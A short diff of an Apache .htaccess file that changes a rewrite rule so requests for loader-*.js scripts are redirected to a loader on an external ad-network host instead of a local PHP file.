@@ -1,3 +1,3 @@
 Options -Indexes
 RewriteEngine on
-RewriteRule ^loader.js$ loader.php
+RewriteRule ^loader-(.*).js$ https://pusher.f5ads.com/loader.php?GPS=$1
